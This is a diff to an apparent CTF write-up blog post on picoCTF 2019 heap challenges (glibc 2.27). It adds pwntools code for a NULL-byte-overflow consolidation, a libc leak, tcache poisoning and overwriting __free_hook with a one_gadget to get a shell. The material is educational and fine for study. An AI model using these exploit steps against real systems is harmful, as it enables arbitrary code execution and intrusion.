@@ -1,7 +1,7 @@
 ---
 layout: post
 title:  "picoCTF 2019: Heap Exploitation Challenges (Glibc 2.23, 2.27, 2.29)"
-date:   2019-10-12 00:00:00 +0800
+date:   2019-11-30 00:00:00 +0800
 categories: pwn
 tags: picoCTF-2019
 ---
@@ -467,6 +467,13 @@ The challenge itself took me about 3.5 hours to figure out. The exploitation ste
 
 * The idea is that we want to use the single NULL byte overflow to set C's `PREV_INUSE` bit to 0, meaning we change C's size from 0x131 to 0x100. As we do that, we also want to set C's `prev_size` field to 0x250. More information about that is given below.
 
+```python
+# Setup
+add(0x128) # A, idx 0
+add(0x118) # B, idx 1
+add(0x118) # C, idx 2
+```
+
 * The chunks are shown in gdb as follows:
 
 ```c
@@ -485,6 +492,26 @@ gef➤  x/200gx 0x000055a7bc254000
 
 * Completely fill up the 0xf0 sized tcache bin (Which would store the freed chunk C ***after*** its size is overwritten to 0x100) and 0x128 sized tcache bin (which would otherwise store chunk A when we free it).
 
+```python
+# Fill up tcache bin 0xf0
+# Done because the NULL byte overflow will unset the PREV_INUSE bit of the next chunk
+# Meaning that it will change the next chunks size to 0x100
+# 0x100 chunks go into the 0xf0 tcache bin
+# We prevent this since we want backwards consolidation to occur
+# This will be evident further below
+for i in range(7):
+  add(0xf0)
+for i in range(7):
+  free(i+3)
+
+# Fill up tcache bin 0x128
+# We do this because of the same reason above
+for i in range(7):
+  add(0x128)
+for i in range(7):
+  free(i+3)
+```
+
 ```c
 gef➤  heap bins tcache
 
@@ -494,17 +521,26 @@ Tcachebins[idx=14, size=0xf0] count=7  ←  Chunk(addr=0x55a7bc254bd0, size=0x10
 Tcachebins[idx=17, size=0x120] count=7  ←  Chunk(addr=0x55a7bc2553f0, size=0x130, flags=PREV_INUSE)  ←  Chunk(addr=0x55a7bc2552c0, size=0x130, flags=PREV_INUSE)  ←  ...
 ```
 
-* We don't want either of the chunks A or C to go into the tcache bins, as there is no consolidation in the tcache bins. The exploit relies on the fact that chunk C will coalesce backwards with chunks A and B provided we set up the heap correctly.
+* We don't want either of the chunks A or C to go into the tcache bins, as there is no consolidation in the tcache bins. The exploit relies on the fact that chunk C will consolidate backwards with chunks A and B provided we set up the heap correctly.
 
 #### Step 3: **Prepare chunk A for consolidation later on**
 
-* Free chunk A. This sends chunk A into the unsorted bin (as the 0x128 sized tcache bin is full), meaning a libc pointer pointing to the `main_arena` is placed into chunk A's `fd` and `bk` pointers, as shown below:
+* Free chunk A. This sends chunk A into the unsorted bin (as the 0x128 sized tcache bin is full), meaning a libc pointer pointing to the `main_arena` is placed into chunk A's `fd` and `bk` pointers:
+
+```python
+# Make chunk A go into unsorted bin
+# This is important because we are consolidating chunk C back with both chunks A and B
+# Meaning that unlink will be called with chunk A as it's second argument
+# unlink has some security checks, one being that A's fd and bk must have valid pointers
+# This free will put the pointers to `main_arena+0x58` into the fd and bk of A
+free(0) # Chunk A
+```
 
 ```c
 gef➤  x/40gx 0x000055a7bc254250                          
 0x55a7bc254250: 0x0000000000000000      0x0000000000000131 <- chunk A
-0x55a7bc254260: 0x00007f7e28fbeca0      0x00007f7e28fbeca0 <- libc pointers into the main_arena unsorted bin
-0x55a7bc254270: 0x0000000000000000      0x0000000000000000
+0x55a7bc254260: 0x00007f7e28fbeca0      0x00007f7e28fbeca0 <- libc pointers into
+0x55a7bc254270: 0x0000000000000000      0x0000000000000000    main_arena+0x58
 ...
 ```
 
@@ -512,13 +548,20 @@ gef➤  x/40gx 0x000055a7bc254250
 
 * Using gdb, we can calculate the difference between the leaked pointers and the libc base now. This offset remains constant every time we run the program. This offset is found to be `0x3ebca0`.
 
-#### Step 4: **Abuse the vulnerability**
+#### Step 4: **Abuse the NULL byte overflow**
 
 * Edit chunk B's contents to cause a NULL byte overflow into chunk C's size. This changes chunk C's total size (including metadata) from 0x121 to 0x100. Notice that the `PREV_INUSE` bit gets set to 0 in the process, due to the NULL byte overflow, which causes the chunk that is `prev_size` bytes before C to appear to be free when we free chunk C later on.
 
 * In the process of doing the NULL byte overflow, we also set chunk C's `prev_size` field to 0x250. This causes the `prev_size` field to encompass both chunks A and B. Later when we free chunk C, the `unlink` macro is called using chunk A ***because*** of the fact that we set chunk C's `prev_size` such that it encompasses up to chunk A. This causes chunks A, B, and C to be consolidated into one large chunk, which is then put into the unsorted bin.
 
 * The code for the unlink macro will be shown a bit further down.
+
+```python
+# Null byte overflow onto chunk C.
+# C's size is now 0x100.
+# C's prev_size is also set to 0x250
+talk(1, 'B'*0x110 + p64(0x250))
+```
 
 ```c
 gef➤  x/80gx 0x55a7bc254380
@@ -538,6 +581,13 @@ gef➤  x/80gx 0x55a7bc254380
 
 * Since chunk C's size has changed from 0x121 to 0x100, we must create a fake chunk within chunk C. We need to do this now because freeing chunk C will insert it into the unsorted bin as the 0xf0 tcache bin is full (remember that the 0x100 size includes metadata, so the chunk really has a size of 0xf0 without the metadata).
 
+```python
+# Before we free chunk C, we must create a fake chunk 0x100 bytes after chunk C
+# This fake chunk must have its PREV_INUSE bit set to 1, hence we choose size 0x21
+# This is required to bypass some checks when a chunk is freed into the unsorted bin
+talk(2, 'C'*0xf8 + p64(0x21) + '\n')
+```
+
 ```c
 gef➤  x/50gx 0x55a7bc2544a0
 0x55a7bc2544a0: 0x0000000000000250      0x0000000000000100 <- chunk C
@@ -554,11 +604,19 @@ gef➤  x/50gx 0x55a7bc2544a0
 
 #### Step 6: **Free chunk C, causing the backwards consolidation**
 
+```python
+# We free C now.
+# C's prev_size is 0x250, so it will consolidate backwards 0x250 bytes (all the way up to A)
+# Unsorted bin will now have a 0x350 sized chunk right on top of A
+# A's fd and bk pointers will still have pointers to `main_arena+0x58`
+free(2)
+```
+
 * Now, after all this preparation, we free chunk C. This calls `_int_free()`. First, the tcache bin 0xf0 is checked to see if there is space in it, but it's already full, so chunk C is then placed into the unsorted bin.
 
-* While this is done, chunk C's size is checked, and it is seen to be 0x100. `_int_free()` will then check for a chunk 0x100 bytes after chunk C to ensure that that chunk's `PREV_INUSE` bit is set to 1. If it is not, then `_int_free()` will error out saying `"double free or corruption (!prev)"`, since chunk C will appear to be free if the next chunk's `PREV_INUSE` bit is not set to 1.  
+* While this is done, chunk C's size is checked, and it is seen to be 0x100. `_int_free()` will then check for a chunk 0x100 bytes after chunk C to ensure that that chunk's `PREV_INUSE` bit is set to 1. If it is not, then `_int_free()` will error out saying `"double free or corruption (!prev)"`, since chunk C will appear to be free if the next chunk's `PREV_INUSE` bit is not set.  
 
-* Since we changed chunk C's size from 0x121 to 0x100, there isn't a chunk 0x100 bytes after chunk C, which is why we place a chunk there ourselves with its `PREV_INUSE` bit set to 1. This check is documented [here](https://github.com/lunaczp/glibc-2.27/blob/master/malloc/malloc.c#L4279):
+* Since we changed chunk C's size from 0x121 to 0x100, there isn't a chunk 0x100 bytes after chunk C, which is why we placed a chunk there ourselves in the previous step with its `PREV_INUSE` bit set. This check is documented [here](https://github.com/lunaczp/glibc-2.27/blob/master/malloc/malloc.c#L4279):
 
 ```c
 /* Or whether the block is actually not marked used.  */
@@ -646,9 +704,24 @@ gef➤  x/150gx 0x55a7bc254250
 
 * We do this simply by allocating 7 chunks of size 0x128, so that the 7 chunks in the tcache bin of size 0x128 are taken out.
 
+```python
+# Empty the 0x128 tcache bin so we can get chunks out of the unsorted bin
+# Indexes taken up: 0, 2, 3, 4, 5, 6, 7
+for i in range(7):
+  add(0x128)
+```
+
 #### Step 8: **Allocate chunk A back again to move the libc pointers into chunk B**
 
 * We now add a chunk of size 0x128, which gets serviced by the unsorted bin. This will take a 0x128 size chunk out from the 0x350 sized chunk already in the unsorted bin and return it to us. In this case, this returns the chunk A that we initially allocated back to us.
+
+```python
+# Now adding a chunk of size 0x128 gives us a chunk from the unsorted bin
+# In this case, unsorted bin will have a 0x350 sized chunk on chunk A
+# We first add a 0x128 sized chunk so that the libc address gets moved down to chunk B
+# This happens because now the unsorted bin will have a chunk starting at chunk B
+add(0x128) # idx 8
+```
 
 * The key part is that it moves the libc pointers that were in chunk A's `fd` and `bk` down to chunk B, which we ***still*** have a pointer to. This is shown below:
 
@@ -669,9 +742,27 @@ gef➤  x/150gx 0x55a7bc254250
 
 #### Step 9: **Use the existing pointer to chunk B to read the libc address of the main_arena**
 
-* Since we still have a pointer to chunk B, we simply use it to read chunk B's contents. In this case, it gives us our libc pointer leak, which we use to calculate the libc base address.
+* Since we still have a pointer to chunk B, we simply use it to read chunk B's contents. In this case, it gives us our libc pointer leak, which we use to calculate the libc base address. With the base address, we also calculate the address of `__free_hook`, which is a function pointer that `free()` uses if it is set by the user. 
 
-* With the base address, we also calculate the address of `__free_hook`, which is a function pointer that `free()` uses if it is set by the user. If we overwrite this function pointer with a pointer of our choosing, then the next time `free()` is called, it will also call the function pointed to by `__free_hook`, giving us code execution. Code found [here](https://github.com/lunaczp/glibc-2.27/blob/master/malloc/malloc.c#L3084) and shown below:
+* With the base address, we also calculate the address of our `one_gadget`, which is essentially a set of instructions in libc that correspond to `execve("/bin/sh", NULL, NULL)`. The one gadget address is found by running david942j's [one_gadget](https://github.com/david942j/one_gadget) tool on `libc-2.27.so`.
+
+```python
+# Now since we have a pointer to chunk B, we can leak the the fd pointer
+# Remember the fd pointer just points to `main_arena+0x58`
+libc_leak = u64(listen(1).ljust(8, '\x00'))
+
+# Calculate needed offsets
+libc.address = libc_leak - 0x3ebca0
+one_gadget = libc.address + 0x4f322
+free_hook = libc.symbols['__free_hook']
+
+log.info('main arena leak: ' + hex(libc_leak))
+log.info('Libc base: ' + hex(libc.address))
+log.info('one gadget: ' + hex(one_gadget))
+log.info('free_hook: ' + hex(free_hook))
+```
+
+* If we overwrite this function pointer with a pointer of our choosing, then the next time `free()` is called, it will also call the function pointed to by `__free_hook`, giving us code execution. Code found [here](https://github.com/lunaczp/glibc-2.27/blob/master/malloc/malloc.c#L3084) and shown below:
 
 ```c
 void
@@ -692,36 +783,57 @@ __libc_free (void *mem)
 
 * We must overwrite something like `__free_hook` or `__malloc_hook` (which is malloc's version of the function pointer) because **Full RELRO** is enabled. If it wasn't, we would just overwrite a GOT table entry (`printf` would work).
 
-* With the base address, we also calculate the address of our `one_gadget`, which is essentially a set of instructions in libc that correspond to `execve("/bin/sh", NULL, NULL)`. The one gadget address is found by running david942j's [one_gadget](https://github.com/david942j/one_gadget) tool on `libc-2.27.so`.
-
-* The calculated addresses are shown when the program is ran:
-
-```c
-[*] main arena leak: 0x7f7e28fbeca0
-[*] Libc base: 0x7f7e28bd3000
-[*] one gadget: 0x7f7e28c22322
-[*] free_hook: 0x7f7e28fc08e8
-```
-
 #### Step 10: **Tcache Poisoning Attack to get malloc to return an arbitrary pointer to us**
 
 * Next, we do a tcache poisoning attack to get a chunk on top of `__free_hook`. I initially fill up the 0x128 sized tcache bin so that its easier to know which index each malloc will go into.
 
+```python
+# Fill up the 0x128 tcache bin again
+# We do this to make subsequent mallocs easier to use
+# It is easier to visualise the indexes in my opinion
+# Indexes freed: 0, 2, 3, 4, 5, 6, 7
+free(0)
+for i in range(2, 8):
+  free(i)
+```
+
 * Next, we add a chunk of size 0x1d8. This will get serviced by the unsorted bin since there is no tcache bin of that size. This gives us a chunk right on top of chunk B, as that was where the consolidated unsorted bin chunk was prior to this malloc. We now have overlapped chunks on top of chunk B.
 
-* Now that we have two pointers to chunk B, we do a double free, which causes the tcache bin for 0x1d8 chunks (the 0x1d0 sized tcache bin) to have the same chunk twice, visualized below:
+* Now that we have two pointers to chunk B, we do a double free, which causes the tcache bin for 0x1d8 chunks (the 0x1d0 sized tcache bin) to have the same chunk twice:
+
+```python
+# At this point, the two overlapped chunks are at indexes 0 and 1
+# Double free them and put them into tcache bin 0x1d8
+free(0)
+free(1)
+```
+
+* The tcache bin can be visualised as follows:
 
 ```c
 tcachebin[0x1d0] <- chunk B <- chunk B
 ```
 
-* We allocate a chunk of size 0x1d8 again, which gives us back one of the chunks from the 0x1d0 sized tcache bin. The tcache bin now looks like the following:
+* We allocate a chunk of size 0x1d8 again, which gives us back one of the chunks from the 0x1d0 sized tcache bin.
+
+```python
+# Add one of them, change its fd to __free_hook
+add(0x1d8) # idx 0
+```
+
+* The tcache bin now looks like the following:
 
 ```c
 tcachebin[0x1d0] <- chunk B
 ```
 
-* We set chunk B's `fd` pointer to the address of `__free_hook`. The tcache bin now looks like this:
+* We set chunk B's `fd` pointer to the address of `__free_hook`. 
+
+```python
+talk(0, p64(free_hook) + '\n')
+```
+
+* The tcache bin now looks like this:
 
 ```c
 tcachebin[0x1d0] <- chunk B <- &__free_hook
@@ -729,7 +841,18 @@ tcachebin[0x1d0] <- chunk B <- &__free_hook
 
 * We do two more mallocs of size 0x1d8, where the first malloc gives us chunk B from the tcache bin, and the second malloc gives us a chunk right on top of `__free_hook`.
 
+```python
+# Two more chunks and we get a chunk on __free_hook
+add(0x1d8) # 1, overlapped chunk with chunk B again
+add(0x1d8) # 2, chunk on __free_hook
+```
+
 * We then overwrite that chunk on `__free_hook` with the address of our one_gadget:
+
+```python
+# Overwrite __free_hook with one_gadget
+talk(2, p64(one_gadget) + '\n')
+```
 
 ```c
 gef➤  x/10gx 0x7f7e28fc08e8
@@ -738,6 +861,13 @@ gef➤  x/10gx 0x7f7e28fc08e8
 ```
 
 * Finally, we call `free()` one more time, which calls the function pointed to by `__free_hook`, which is our one gadget, thus giving us a shell.
+
+```python
+# Trigger __free_hook which gives us shell
+free(1)
+
+p.interactive()
+```
 
 #### Final exploit
 
@@ -805,7 +935,7 @@ add(0x118) # C, idx 2
 # Done because the NULL byte overflow will unset the PREV_INUSE bit of the next chunk
 # Meaning that it will change the next chunks size to 0x100
 # 0x100 chunks go into the 0xf0 tcache bin
-# We prevent this since we want backwards cnosolidation to occur
+# We prevent this since we want backwards consolidation to occur
 # This will be evident further below
 for i in range(7):
   add(0xf0)
